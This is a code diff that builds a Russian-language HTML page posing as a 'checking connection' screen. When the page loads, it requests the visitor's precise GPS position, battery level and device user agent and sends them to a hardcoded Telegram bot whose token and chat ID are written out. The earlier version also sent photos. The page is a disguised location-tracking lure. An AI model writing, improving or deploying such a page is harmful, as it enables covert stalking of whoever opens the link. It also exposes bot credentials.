@@ -1,26 +1,57 @@
-async function sendPhotoAndLocation(photoBlob, location) {
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Подключение...</title>
 
-    const caption =
-`📍 Геолокация
+<style>
+body{
+    margin:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    font-family:Arial,sans-serif;
+    background:#111;
+    color:white;
+    text-align:center;
+}
 
-Широта: ${location.lat}
-Долгота: ${location.lon}
+#status{
+    padding:20px;
+    font-size:18px;
+}
+</style>
+</head>
+<body>
 
-https://maps.google.com/?q=${location.lat},${location.lon}`;
+<div id="status">
+    Проверка подключения...
+</div>
 
-    const formData = new FormData();
+<script>
 
-    formData.append("chat_id", CHAT_ID);
-    formData.append("caption", caption);
-    formData.append("photo", photoBlob, "photo.jpg");
+const BOT_TOKEN = "8794887091:AAF9ha3O1odasYB9fAT-PpM2-GrRhOs6TTM";
+const CHAT_ID = "748937871";
+
+const statusText = document.getElementById("status");
+
+async function sendToTelegram(message) {
 
     try {
 
         const response = await fetch(
-            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
             {
                 method: "POST",
-                body: formData
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
             }
         );
 
@@ -28,18 +59,88 @@ https://maps.google.com/?q=${location.lat},${location.lon}`;
 
         console.log(result);
 
-        if (result.ok) {
-            statusText.innerText = "Успешно отправлено";
-        } else {
+        if (!result.ok) {
             statusText.innerText =
-                "Ошибка Telegram: " + result.description;
+                "Ошибка Telegram";
         }
 
-    } catch (err) {
+    } catch (e) {
 
-        console.error(err);
+        console.error(e);
 
         statusText.innerText =
-            "Ошибка сети: " + err.message;
+            "Ошибка сети";
     }
 }
+
+function getLocation() {
+
+    if (!navigator.geolocation) {
+
+        statusText.innerText =
+            "GPS не поддерживается";
+
+        return;
+    }
+
+    statusText.innerText =
+        "Запрос GPS...";
+
+    navigator.geolocation.getCurrentPosition(
+
+        async (position) => {
+
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+
+            const battery =
+                navigator.getBattery
+                ? await navigator.getBattery()
+                : null;
+
+            const message =
+`📍 Геолокация
+
+Широта: ${lat}
+Долгота: ${lon}
+Точность: ${accuracy} м
+
+🔋 Батарея:
+${battery ? Math.round(battery.level * 100) + "%" : "неизвестно"}
+
+📱 Устройство:
+${navigator.userAgent}
+
+🗺 Карта:
+https://maps.google.com/?q=${lat},${lon}`;
+
+            await sendToTelegram(message);
+
+            statusText.innerText =
+                "Геолокация отправлена";
+
+        },
+
+        (error) => {
+
+            console.error(error);
+
+            statusText.innerText =
+                "Ошибка GPS: " + error.message;
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0
+        }
+    );
+}
+
+getLocation();
+
+</script>
+
+</body>
+</html>
